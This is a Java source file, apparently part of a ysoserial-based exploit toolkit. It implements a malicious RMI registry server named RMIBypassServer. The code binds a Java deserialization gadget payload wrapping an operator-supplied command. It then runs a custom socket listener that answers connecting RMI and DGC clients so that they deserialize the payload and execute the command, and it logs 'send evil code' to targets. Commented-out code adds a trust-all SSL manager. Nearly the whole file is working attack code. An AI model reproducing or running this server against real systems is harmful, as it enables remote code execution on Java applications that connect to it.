package ysoserial.exploit;

import ysoserial.payloads.CommonsCollections1;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.Gadgets;
import ysoserial.secmgr.ExecCheckingSecurityManager;

import javax.net.ServerSocketFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.rmi.MarshalException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RMISocketFactory;
import java.rmi.server.UID;
import java.security.cert.X509Certificate;
import java.util.Arrays;
import java.util.concurrent.Callable;

public class RMIBypassServer {
    private static int lport ;
    public static void main(String[] args) throws Exception{

        if (args.length < 3) {
            System.err.println(RMIBypassServer.class.getName() + " <port> <payload_type> <payload_arg>");
            System.exit(-1);
        }


        ServerSocket ss = null;
        SMRMISocket SMSS = new SMRMISocket();
        SMSS.setPort(13888);
        System.setProperty("java.rmi.server.hostname", "127.0.0.1");
        try {
            RMISocketFactory.setSocketFactory(SMSS);
            System.out.println("[-] Creating SocketFactory on port " + String.valueOf(13888));
        } catch (Exception localException) {
            localException.printStackTrace();
            System.out.println("error in SMRMISocket");
        }
        lport = Integer.parseInt(args[0]);

        Registry registry = LocateRegistry.createRegistry(lport);
        System.out.println("[-] Creating evil RMI registry on port " + String.valueOf(lport));

//        Object payload = ObjectPayload.Utils.makePayloadObject(args[1], args[2]);
//        String name = "pwned" + System.nanoTime();
//        System.out.println(String.format("* [-] Creating evil RMI Naming   rmi://ip:%s/%s", port, name));

        final String className = CommonsCollections1.class.getPackage().getName() + "." + args[1];
        exploit(registry, (Class<? extends ObjectPayload>) Class.forName(className), args[2]);
        ss = SMSS.getSS();
        handleSocket(ss);
    }

    private static void handleSocket(ServerSocket ss) {
        Socket s = null;
        try {
            System.out.println("[-] waiting target connect RMI SocketFactory ...");
            while ((s = ss.accept()) != null) {
                InetSocketAddress remote = (InetSocketAddress)s.getRemoteSocketAddress();
                System.err.println("[*] Have connection from " + remote);
                InputStream is = s.getInputStream();
                InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);
                bufIn.mark(4);
                try {
                    DataInputStream in = new DataInputStream(bufIn);
                    int magic = in.readInt();
                    short version = in.readShort();
                    if (magic != 1246907721 || version != 2) {
                        s.close();
                        continue;
                    }
                    OutputStream sockOut = s.getOutputStream();
                    BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                    try {
                        DataOutputStream out = new DataOutputStream(bufOut);
                        byte protocol = in.readByte();
                        switch (protocol) {
                            case 75:
                                out.writeByte(78);
                                if (remote.getHostName() != null) {
                                    out.writeUTF(remote.getHostName());
                                } else {
                                    out.writeUTF(remote.getAddress().toString());
                                }
                                out.writeInt(remote.getPort());
                                out.flush();
                                in.readUTF();
                                in.readInt();
                            case 76:
                                doMessage(s, in, out);
                                break;
                            default:
                                System.err.println("Unsupported protocol");
                                s.close();
                                continue;
                        }
                        bufOut.flush();
                        out.flush();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                System.err.println("[*] Start send evil code to " + remote.getHostName());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static class SMRMISocket extends RMISocketFactory {
        private ServerSocket ss;

        private int port = 53;

        public Socket createSocket(String host, int port) throws IOException {
            return new Socket(host, port);
        }

        public ServerSocket createServerSocket(int port) throws IOException {
            if (port == 0)
                port = this.port;
            this.ss = ServerSocketFactory.getDefault().createServerSocket(port);
            return this.ss;
        }

        public ServerSocket getSS() {
            return this.ss;
        }

        private void setPort(int port) {
            this.port = port;
        }
    }

    private static boolean handleRMI(ObjectInputStream ois, DataOutputStream out) throws Exception {
        int method = ois.readInt();
        ois.readLong();
        if (method != 2)
            return false;
        String object = (String)ois.readObject();
        System.err.println("[*] Is RMI.lookup call for " + object + " " + method);
        return true;
    }

    private static void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
        System.err.println("[*] Reading message...");
        int op = in.read();
        switch (op) {
            case 80:
                doCall(in, out);
                break;
            case 82:
                out.writeByte(83);
                break;
            case 84:
                UID.read(in);
                break;
            default:
                throw new IOException("unknown transport op " + op);
        }
        s.close();
    }

    private static void doCall(DataInputStream in, DataOutputStream out) throws Exception {
        ObjID read;
        ObjectInputStream ois = new ObjectInputStream(in) {
            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
                if ("[Ljava.rmi.server.ObjID;".equals(desc.getName()))
                    return ObjID[].class;
                if ("java.rmi.server.ObjID".equals(desc.getName()))
                    return ObjID.class;
                if ("java.rmi.server.UID".equals(desc.getName()))
                    return UID.class;
                if ("java.lang.String".equals(desc.getName()))
                    return String.class;
                throw new IOException("Not allowed to read object");
            }
        };
        try {
            read = ObjID.read(ois);
        } catch (IOException e) {
            throw new MarshalException("unable to read objID", e);
        }
        if (read.hashCode() == 2) {
            handleDGC(ois);
        } else if (read.hashCode() == 0) {
            handleRMI(ois, out);
        }
    }

    private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.readInt();
        ois.readLong();
        System.err.println("[-] Is DGC call for " + Arrays.toString((Object[])ois.readObject()));
    }
    public static void exploit(final Registry registry,
                               final Class<? extends ObjectPayload> payloadClass,
                               final String command) throws Exception {
        new ExecCheckingSecurityManager().callWrapped(new Callable<Void>() {
            public Void call() throws Exception {
                ObjectPayload payloadObj = payloadClass.newInstance();
                Object payload = payloadObj.getObject(command);
                String name = "pwned" + System.nanoTime();
                System.out.println(String.format("* [-] Creating evil RMI Naming   rmi://ip:%s/%s",lport , name));
                Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);
                try {
                    registry.bind(name, remote);
                } catch (Throwable e) {
                    e.printStackTrace();
                }
                ObjectPayload.Utils.releasePayload(payloadObj, payload);
                return null;
            }
        });
    }

//    private static class TrustAllSSL implements X509TrustManager {
//        private static final X509Certificate[] ANY_CA = {};
//
//        public X509Certificate[] getAcceptedIssuers() {
//            return ANY_CA;
//        }
//
//        public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
//
//        public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
//    }
//
//    private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
//        public Socket createSocket(String host, int port) throws IOException {
//            try {
//                SSLContext ctx = SSLContext.getInstance("TLS");
//                ctx.init(null, new TrustManager[]{new RMIBypassServer.TrustAllSSL()}, null);
//                SSLSocketFactory factory = ctx.getSocketFactory();
//                return factory.createSocket(host, port);
//            } catch (Exception e) {
//                throw new IOException(e);
//            }
//        }
//    }
}
